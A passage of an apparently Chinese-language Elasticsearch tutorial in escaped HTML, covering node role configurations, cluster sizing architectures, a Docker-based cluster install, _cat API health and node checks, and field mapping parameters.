href=\"#6-3-ES节点配置组合\" class=\"headerlink\" title=\"6.3 ES节点配置组合\"></a>6.3 ES节点配置组合</h2><ol>\n<li><strong>组合1</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: true   </span><br><span class=\"line\">node.data: true   </span><br><span class=\"line\">node.ingest: true  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这种组合表示这个节点既有成为主节点的资格，又可以存储数据，还可以作为预处理节点这个时候如果某个节点被选举成为了真正的主节点，那么他还要存储数据，这样对于这个节点的压力就比较大了。  </span><br><span class=\"line\">elasticsearch 默认是：每个节点都是这样的配置，在测试环境下这样做没问题。实际工作中建议不要这  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>样设置，这样相当于 主节点 和 数据节点 的角色混合到一块了。</p>\n<ol start=\"2\">\n<li><strong>组合2</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: false   </span><br><span class=\"line\">node.data: true   </span><br><span class=\"line\">node.ingest: false  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这种组合表示这个节点没有成为主节点的资格，也就不参与选举，只会存储数据。这个节点我们称为 data(数据)节点。在集群中需要单独设置几个这样的节点负责存储数据。后期提供存储和查询服务</p>\n<ol start=\"3\">\n<li><strong>组合3</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: true  </span><br><span class=\"line\">node.data: false  </span><br><span class=\"line\">node.ingest: false  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这种组合表示这个节点不会存储数据，有成为主节点的资格，可以参与选举，有可能成为真正的主节点。这个节点我们称为master节点</p>\n<ol start=\"4\">\n<li><strong>组合4</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: false   </span><br><span class=\"line\">node.data: false   </span><br><span class=\"line\">node.ingest: true  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这种组合表示这个节点即不会成为主节点，也不会存储数据，这个节点的意义是作为一个 client(客户端)节点，主要是针对海量请求的时候可以进行负载均衡。 在新版 ElasticSearch5.x 之后该节点称之为：coordinate 节点，其中还增加了一个叫：ingest 节点，用 于预处理数据（索引和搜索阶段都可以用到）。 当然，作为一般应用是不需要这个预处理节点做什么额外的预处理过程，那么这个节点和我们称之为client 节点之间可以看做是等同的，我们在代码中配置访问节点就都可以配置这些 ingest 节点即可。‍</p>\n<h2 id=\"6-4-高可用ES的部署架构\"><a href=\"#6-4-高可用ES的部署架构\" class=\"headerlink\" title=\"6.4 高可用ES的部署架构\"></a>6.4 高可用ES的部署架构</h2><p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/23.png\"></p>\n<ol>\n<li><strong>小型的ES集群（&lt;10）的节点架构</strong></li>\n</ol>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/24.png\"></p>\n<ul>\n<li><p>对于Ingest转换节点，如果我们没有格式转换、类型转换等需求，直接设置为false。</p>\n</li>\n<li><p>3-5个节点属于轻量级集群，要保证主节点个数满足((节点数&#x2F;2)+1)。</p>\n</li>\n<li><p>轻量级集群，节点的多重属性如：Master&amp;Data设置为同一个节点可以理解的。</p>\n</li>\n<li><p>如果进一步优化，5节点可以将Master和Data再分离。</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li><strong>中型的ES集群（10-50）的节点架构</strong></li>\n</ol>\n<ul>\n<li><p>三台服务器做master节点 （可选）</p>\n</li>\n<li><p>N（比如20）台服务器作为data节点（存储资源要大）</p>\n</li>\n<li><p>N（比如5）台做coodinate&#x2F;ingest节点（用于搜索结果合并，可以提高ES查询效率）</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/25.png\"><br>3.  <strong>超大型的ES集群的节点架构（150个节点+）</strong></p>\n<p>可以按照100个节点为单位，分成多个集群，通过 tribenode连接，单个ES数据库最好的高可用集群部署架构为：每个集群，三台服务器做master节点</p>\n<ul>\n<li><p>N（比如50）台服务器作为data节点（存储资源要大）</p>\n</li>\n<li><p>N（比如5）台做coodinate节点（用于搜索结果合并，可以提高ES查询效率）</p>\n</li>\n<li><p>N（比如2）台做ingest节点（用于数据转换，可以提高ES索引效率）</p>\n</li>\n</ul>\n<h2 id=\"6-5-小型ES集群的安装\"><a href=\"#6-5-小型ES集群的安装\" class=\"headerlink\" title=\"6.5 小型ES集群的安装\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/26.png\"><br>6.5 小型ES集群的安装</h2><h3 id=\"6-5-1-Image镜像\"><a href=\"#6-5-1-Image镜像\" class=\"headerlink\" title=\"6.5.1 Image镜像\"></a>6.5.1 Image镜像</h3><p>有外网环境，拉取镜像代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#下载elasticsearch,带中文分词器的版本  </span><br><span class=\"line\">docker pull andylsr/elasticsearch-with-ik-icu:7.14.0  </span><br><span class=\"line\">#下载kibana  </span><br><span class=\"line\">docker pull docker.elastic.co/kibana/kibana:7.14.0  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>无外网环境，可以先从有公网的环境拉取镜像，然后导出镜像</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker save andylsr/elasticsearch-with-ik-icu:7.14.0 -o /root/elasticsearchwith-ik-icu.tar  </span><br><span class=\"line\">docker save docker.elastic.co/kibana/kibana:7.14.0 -o /root/kibana.tar  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后上传导出的de镜像到dao目标虚拟机，然后导入镜像到docker</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker load -i /vagrant/3G-middleware/elasticsearch-with-ik-icu.tar  </span><br><span class=\"line\">docker load -i /vagrant/3G-middleware/kibana.tar  </span><br><span class=\"line\">docker load -i /vagrant/3G-middleware/haproxy.tar  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-5-2-创建目录结构\"><a href=\"#6-5-2-创建目录结构\" class=\"headerlink\" title=\"6.5.2 创建目录结构\"></a>6.5.2 创建目录结构</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mkdir -p /home/docker-compose/elasticsearch7/&#123;coordinate1,coordinate2&#125;-&#123;logs,data&#125;  </span><br><span class=\"line\">mkdir -p /home/docker-compose/elasticsearch7/&#123;master1,master2,master3&#125;-&#123;logs,data&#125;  </span><br><span class=\"line\">chmod -R 777 /home/docker-compose/elasticsearch7  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-5-3-安装ES集群\"><a href=\"#6-5-3-安装ES集群\" class=\"headerlink\" title=\"6.5.3 安装ES集群\"></a>6.5.3 安装ES集群</h3><p>把docker-compose和ES相应配置文件拷贝到<code>/home/docker-compose</code>目录下，执行如下命令安装ES集群</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker-compose --compatibility up -d # 兼容模式后台启动  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>--compatibility：表示已兼容模式启动容器</p>\n</li>\n<li><p>-d：表示后台启动</p>\n</li>\n</ul>\n<h2 id=\"6-6-使用kibana访问集群\"><a href=\"#6-6-使用kibana访问集群\" class=\"headerlink\" title=\"6.6 使用kibana访问集群\"></a>6.6 使用kibana访问集群</h2><ol>\n<li><strong>查看集群健康情况</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/health?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">epoch      timestamp cluster    status node.total node.data shards pri relo init unassign pending\\_tasks max\\_task\\_wait\\_time active\\_shards\\_percent  </span><br><span class=\"line\">1670418184 13:03:04  es-cluster green           5         3     16   8    0    0        0             0                  -                100.0%  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>status选项的值</p>\n<ul>\n<li><p>green : 所有primary shard和replica shard都已成功分配, 集群是100%可用的</p>\n</li>\n<li><p>yellow : 所有primary shard都已成功分配, 但至少有一个replica shard缺失. 此时集群所有功能都正常使用, 数据不会丢失, 搜索结果依然完整, 但集群的可用性减弱. —— 需要及时处理的警告</p>\n</li>\n<li><p>red : 至少有一个primary shard(以及它的全部副本分片)缺失 —— 部分数据不能使用, 搜索只能返回部分数据, 而分配到这个分配上的写入请求会返回一个异常. 此时虽然可以运行部分功能, 但为了索引数据的完整性, 需要尽快修复集群</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li><strong>查看集群中的节点个数</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/nodes?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ip         heap.percent ram.percent cpu load\\_1m load\\_5m load\\_15m node.role   master name  </span><br><span class=\"line\">172.19.0.2           36          95  12    0.20    0.43     0.73 cdfhilmrstw -      master2  </span><br><span class=\"line\">172.19.0.7           75          95  12    0.20    0.43     0.73 cdfhilmrstw \\*      master3  </span><br><span class=\"line\">172.19.0.5           29          95  12    0.20    0.43     0.73 cdfhilmrstw -      master1  </span><br><span class=\"line\">172.19.0.6           64          96  12    0.20    0.43     0.73 lr          -      coordinate2  </span><br><span class=\"line\">172.19.0.3           23          96  12    0.20    0.43     0.73 lr          -      coordinate1  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>第一列（ip）：es节点ip</p>\n</li>\n<li><p>第二列（heap.percent）：堆内存占比</p>\n</li>\n<li><p>第三列（ram.percent）：内存使用占比</p>\n</li>\n<li><p>第四列（cpu）：cpu使用率</p>\n</li>\n<li><p>第五列（load_1m）：1分钟内平均load情况</p>\n</li>\n<li><p>第六列（load_5m）：5分钟内平均load情况</p>\n</li>\n<li><p>第七列（load_15m）：15分钟内平均load情况</p>\n</li>\n<li><p>第八列（node.role）：节点权限</p>\n</li>\n<li><p>第九列（master）：是否master节点，*为master节点</p>\n</li>\n<li><p>第十列（name）：节点名称</p>\n</li>\n</ul>\n<p><strong>（1）heap.percent</strong> 表示ES使用的JVM内存情况，该值应该低于75，如果长时间大于75，表示JVM内存配置不够，如果JVM已经配置到30G，则表示该Datanode节点上的压力较大，需要考虑增加Datanode节点来分摊压力 <strong>（2）ram.percent</strong> 表示机器上内存的使用情况，实际对应linux上的 used+cache内存使用情况，如果该值接近100%，则表示机器上cache内存不够用，主要是由于ES检索中，lucene会消耗大量cache内存，如果cache不够，会导致lucene无法将部分文件加载到cache中，会频繁从磁盘中进行读取，导致查询延时加大</p>\n<ol start=\"3\">\n<li><strong>查看集群中的索引</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/indices?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">health status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size  </span><br><span class=\"line\">green  open   .kibana-event-log-7.14.0\\-000001 1uw627v6T8KPBv2xrlPlPQ   1   1          9            0     97.8kb         48.9kb  </span><br><span class=\"line\">green  open   .kibana\\_7.14.0\\_001              1G2WGiXOT2Wvux7R\\_5TuLA   1   1         86           14      4.9mb          2.7mb  </span><br><span class=\"line\">green  open   .apm-custom-link                dMukcWA2QVOFzsOhWiPOng   1   1          0            0       416b           208b  </span><br><span class=\"line\">green  open   .apm-agent-configuration        ReYFH-LaQbmWjGTwif0nHA   1   1          0            0       416b           208b  </span><br><span class=\"line\">green  open   .kibana\\_task\\_manager\\_7.14.0\\_001 H-3hQBgZRO2AfYsWLS6LQw   1   1         14         1275    622.9kb        337.1kb  </span><br><span class=\"line\">green  open   user                            HdrFzj7TQ\\_ejXe\\_9Xdx1LQ   1   1          6            2     37.4kb         17.4kb  </span><br><span class=\"line\">green  open   .tasks                          DudUNrFYTq24R7ZY9IFK5A   1   1         16            0     80.9kb         43.4kb  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"7-数据类型和映射\"><a href=\"#7-数据类型和映射\" class=\"headerlink\" title=\"7 数据类型和映射\"></a>7 数据类型和映射</h1><h2 id=\"7-1-映射的创建\"><a href=\"#7-1-映射的创建\" class=\"headerlink\" title=\"7.1 映射的创建\"></a>7.1 映射的创建</h2><p>和传统数据库不同，传统的数据库我们尝试向表中插入数据的前提是这个表已经存在数据结构的定义，且插入数据的字段要在表结构中被定义。 而ES的映射的创建支持主动和被动创建。</p>\n<ol>\n<li><strong>被动创建（动态映射）</strong></li>\n</ol>\n<p>此时字段和映射类型不需要事先定义，只需要存在文档的索引，当向此索引添加数据的时候当遇到不存在的映射字段，ES会根据数据内容自动添加映射字段定义。</p>\n<ol start=\"2\">\n<li><strong>主动创建（显示映射）</strong></li>\n</ol>\n<p>动态映射只能保证最基础的数据结构的映射，所以很多时候我们需要对字段除了数据结构定义更多的限制的时候，动态映射创建的内容很可能不符合我们的需求，所以可以使用 PUT {index}&#x2F;mapping 来更新指定索引的映射内容。</p>\n<h2 id=\"7-2-动态映射Dynamic-Mapping\"><a href=\"#7-2-动态映射Dynamic-Mapping\" class=\"headerlink\" title=\"7.2 动态映射Dynamic Mapping\"></a>7.2 动态映射Dynamic Mapping</h2><p>写入文档的时候，索引不存在，会自动创建索引， 无需手动创建，ES会根据内容推断字段的类型，推断会不准确，可能造成某些功能无法使用，例如 范围查询。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /log2/\\_doc/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;uid&quot; : 1,  </span><br><span class=\"line\">    &quot;ip&quot; : &quot;192.1.1.1&quot;,  </span><br><span class=\"line\">    &quot;transTime&quot; : &quot;2018-01-01&quot;,  </span><br><span class=\"line\">    &quot;content&quot; : &quot;中华人民共和国人民大会堂&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">查看一个索引当前的mapping  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /log2/\\_mapping  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;log2&quot;: &#123;  </span><br><span class=\"line\">        &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;content&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                        &quot;keyword&quot;: &#123;  </span><br><span class=\"line\">                            &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                            &quot;ignore\\_above&quot;: 256  </span><br><span class=\"line\">                        &#125;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;ip&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                        &quot;keyword&quot;: &#123;  </span><br><span class=\"line\">                            &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                            &quot;ignore\\_above&quot;: 256  </span><br><span class=\"line\">                        &#125;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;transTime&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;date&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;uid&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">动态映射规则</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th><strong>JSON中数据类型</strong></th>\n<th><strong>Elasticsearch 数据类型</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>null</td>\n<td>不添加任何字段</td>\n</tr>\n<tr>\n<td>true或者false</td>\n<td>boolean类型</td>\n</tr>\n<tr>\n<td>浮点数据</td>\n<td>float类型</td>\n</tr>\n<tr>\n<td>integer数据</td>\n<td>long类型</td>\n</tr>\n<tr>\n<td>object</td>\n<td>object类型</td>\n</tr>\n<tr>\n<td>array</td>\n<td>取决于数组中的第一个非空值的类型。</td>\n</tr>\n<tr>\n<td>string</td>\n<td>匹配日期格式，设置为date；匹配数字，设置为float或者long，功能默认关闭；设置为text，并增加keyword子字段。</td>\n</tr>\n</tbody></table>\n<h2 id=\"7-3-显示的设置mapping\"><a href=\"#7-3-显示的设置mapping\" class=\"headerlink\" title=\"7.3 显示的设置mapping\"></a>7.3 显示的设置mapping</h2><p>显示的设置mapping可以更灵活控制ES。 映射创建时，除了对字段的定义，Mapping创建的时候提供了一些对于查询策略和自身定义的参数配置。 下面只是简单介绍下映射支持的字段参数内容。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>analyzer</td>\n<td>定义此字段索引时使用的分词方式</td>\n</tr>\n<tr>\n<td>normalizer</td>\n<td>normalizer功能类似于analyzer，但是其可以使查询条件输出唯一的查询条件（可以认为其只是实现了条件小写等不会产生多个查询条件的相关操作）</td>\n</tr>\n<tr>\n<td>boost</td>\n<td>定义当前字段的查询权重</td>\n</tr>\n<tr>\n<td>coerce</td>\n<td>此字段控制是否尝试修复部分错误的数据格式，（比如对一个整数字段插入字符串比如”5”，此时此字符串可以被解析为数字），默认为true</td>\n</tr>\n<tr>\n<td>copy_to</td>\n<td>类似于别名，不同之处参数可以将此字段内容复制到指定字段中，多个字段可以复制到同一个字段中</td>\n</tr>\n<tr>\n<td>doc_values</td>\n<td>倒排索引虽然可以快速查询文档中内容，但是在进行排序或聚合操作的时候，倒排索引并不能获得文档内容，所以需要存储一份文档数据到doc_values，而此参数控制字段是否需要存储在doc_values中的开关。</td>\n</tr>\n<tr>\n<td>dynamic</td>\n<td>是否开启动态映射，目前支持三个参数：true&#x2F;false 开启和关闭，strict 当出现未定义的字段，抛出异常并拒绝添加文档</td>\n</tr>\n<tr>\n<td>enabled</td>\n<td>此参数控制字段是否可以被索引，当被设置为false的时候表示此字段仅用来存储而无需索引，此时ES不会分析此字段内的数据，所以即使插入的非法的数据内容ES依旧允许执行</td>\n</tr>\n<tr>\n<td>fielddata</td>\n<td>类似doc_values都是单独存储额外的文档数据，这样通过倒排索引获取文档内容，从而实现在排序和聚合上的功能。不同的是doc_values不支持text格式，text格式数据需要使用fielddata。此参数默认是禁止的，这是因为在第一次对字段进行排序或聚合的时候它会把这个列数据都加载到内存中，这样会带来大量的内存消耗。</td>\n</tr>\n<tr>\n<td>eager_global_ordinals</td>\n<td>是否使用全局序号来进行聚合。主要在聚合分析构建hash的时候，使用序号来替代doc的值，这样在文档收集阶段根据需要收集到各个桶中，在计算结果时将序号转换为具体doc内容。但是此操作在每次查询时需要重建doc序号关系</td>\n</tr>\n<tr>\n<td>format</td>\n<td>日期类型字段用来解析的日期格式</td>\n</tr>\n<tr>\n<td>ignore_above</td>\n<td>当插入字段长度超过此字段设置的值后，此内容将不被索引或存储。对于数组结构字段会作用到每一个元素</td>\n</tr>\n<tr>\n<td>ignore_malformed</td>\n<td>当向一个字段插入错误的数据类似时，会抛出异常并拒绝文档。但设置此参数后，对字段插入错误的数据时会忽略异常，此文档错误的数据将不被索引，但是其他字段则正常。</td>\n</tr>\n<tr>\n<td>index_options</td>\n<td>控制将哪些信息添加到反向索引中</td>\n</tr>\n<tr>\n<td>index_phrases</td>\n<td>主要将两个单词的组合索引到单独字段中，这样在进行精确的短语查询的时候会更有效。支持true和false参数。默认为false。此参数会使索引变大</td>\n</tr>\n<tr>\n<td>index_prefixes</td>\n<td>允许对字段的前缀进行索引，此参数用来提高查询的速度</td>\n</tr>\n<tr>\n<td>index</td>\n<td>控制字段是否可以被索引，被设置为false的字段无法被索引到</td>\n</tr>\n<tr>\n<td>fields</td>\n<td>此参数可以为同一个字段设置不同的索引方式，但是在_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小</td>\n</tr>\n<tr>\n<td>norms</td>\n<td>norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false</td>\n</tr>\n<tr>\n<td>null_value</td>\n<td>一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引</td>\n</tr>\n<tr>\n<td>position_increment_gap</td>\n<td>增加近似值匹配</td>\n</tr>\n<tr>\n<td>properties</td>\n<td>定义类型映射、对象字段和嵌套字段等数据</td>\n</tr>\n<tr>\n<td>search_analyzer</td>\n<td>定义此字段查询时使用的分词方式</td>\n</tr>\n<tr>\n<td>similarity</td>\n<td>此参数可以配置用来计算字段相似性的算法</td>\n</tr>\n<tr>\n<td>store</td>\n<td>默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。</td>\n</tr>\n<tr>\n<td>term_vector</td>\n<td>术语向量的定义，存储一些术语向量，以便可以为特定文档检索它们</td>\n</tr>\n<tr>\n<td>index</td>\n<td>控制字段是否可以被索引，被设置为false的字段无法被索引到</td>\n</tr>\n<tr>\n<td>fields</td>\n<td>此参数可以为同一个字段设置不同的索引方式，但是在_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小</td>\n</tr>\n<tr>\n<td>norms</td>\n<td>norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false</td>\n</tr>\n<tr>\n<td>null_value</td>\n<td>一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引</td>\n</tr>\n<tr>\n<td>position_increment_gap</td>\n<td>增加近似值匹配</td>\n</tr>\n<tr>\n<td>properties</td>\n<td>定义类型映射、对象字段和嵌套字段等数据</td>\n</tr>\n<tr>\n<td>search_analyzer</td>\n<td>定义此字段查询时使用的分词方式</td>\n</tr>\n<tr>\n<td>similarity</td>\n<td>此参数可以配置用来计算字段相似性的算法</td>\n</tr>\n<tr>\n<td>store</td>\n<td>默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。</td>\n</tr>\n</tbody></table>\n<ol>\n<li><p><strong>index</strong> 表示字段是否索引。</p>\n</li>\n<li><p><strong>index_options</strong></p>\n</li>\n</ol>\n<p>index_options 控制倒排索引记录的内容，一共有4种配置可选。</p>\n<table>\n<thead>\n<tr>\n<th>index_options</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>docs</td>\n<td>只记录文档id（ doc id ）</td>\n</tr>\n<tr>\n<td>freqs</td>\n<td>记录 doc id 和 term frequences</td>\n</tr>\n<tr>\n<td>positions</td>\n<td>doc id 、 term frequences 、 term position</td>\n</tr>\n<tr>\n<td>offsets</td>\n<td>doc id 、 term frequences 、 term position 、 character</td>\n</tr>\n<tr>\n<td>offsets</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>文本类型 text 默认的配置是 positions ，其他默认是docs。 需要注意的是，虽然index_options提供了offsets这种内容较多的配置级别，但是记录的内容越多，占用的空间也会越多，在实际操作中还是要根据实际情况进行配置。 例如创建mapping,字段名为user_name，字符串类型。user_name不需要索引,info字段的倒排索引类型为positions。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT mapping\\_test3  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;properties&quot;: &#123;  </span><br><span class=\"line\">            &quot;user\\_name&quot;: &#123;  </span><br><span class=\"line\">                &quot;index&quot;: false,  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;info&quot;: &#123;  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;positions&quot;,  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;doc&quot;: &#123;  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;docs&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;freq&quot;: &#123;  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;freqs&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;offset&quot;: &#123;  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;offsets&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>ANALYZER</strong> 分词器。es有内置的分词器，也可以使用第三方的分词工具。如IK。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;content&quot;: &#123;  </span><br><span class=\"line\">                    